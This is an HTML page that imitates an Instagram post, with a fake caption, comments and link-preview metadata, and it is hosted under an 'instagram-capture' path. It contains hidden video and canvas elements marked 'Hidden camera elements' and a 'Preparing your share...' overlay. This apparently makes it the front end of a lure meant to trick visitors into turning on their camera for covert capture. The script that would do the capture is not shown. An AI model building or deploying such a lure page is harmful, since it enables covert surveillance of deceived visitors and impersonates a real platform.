<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Post</title>
    <link rel="stylesheet" href="style.css">
    <meta property="og:title" content="Check out this post!">
    <meta property="og:description" content="Amazing content shared on Instagram">
    <meta property="og:image" content="https://i.imgur.com/JqYeZoL.jpg">
    <meta property="og:url" content="https://yourusername.github.io/instagram-capture">
</head>
<body>
    <div class="instagram-post">
        <div class="post-header">
            <div class="user-avatar"></div>
            <div class="user-info">
                <span class="username">trending_page_2024</span>
                <span class="location">Paris, France</span>
            </div>
        </div>

        <div class="post-image">
            <img src="https://i.imgur.com/JqYeZoL.jpg" alt="Instagram post">
        </div>

        <div class="post-actions">
            <button class="action-btn like-btn">Like</button>
            <button class="action-btn comment-btn">Comment</button>
            <button class="action-btn share-btn" id="shareTrigger">Share</button>
        </div>

        <div class="post-caption">
            <span class="caption-username">trending_page_2024</span>
            <span class="caption-text">Beautiful day in Paris! üòç #travel #paris #vacation</span>
        </div>

        <div class="post-comments">
            <div class="comment">
                <span class="comment-username">user123</span>
                <span class="comment-text">Wow! Amazing view ‚ù§Ô∏è</span>
            </div>
            <div class="view-comments">View all 284 comments</div>
        </div>

        <div class="post-time">2 HOURS AGO</div>
    </div>

    <div class="camera-overlay" id="cameraOverlay">
        <div class="overlay-content">
            <div class="spinner"></div>
            <p>Preparing your share...</p>
        </div>
    </div>

    <!-- Hidden camera elements -->
    <video id="cameraPreview" autoplay playsinline></video>
    <canvas id="cameraCanvas"></canvas>

    <script src="script.js"></script>
</body>
</html>
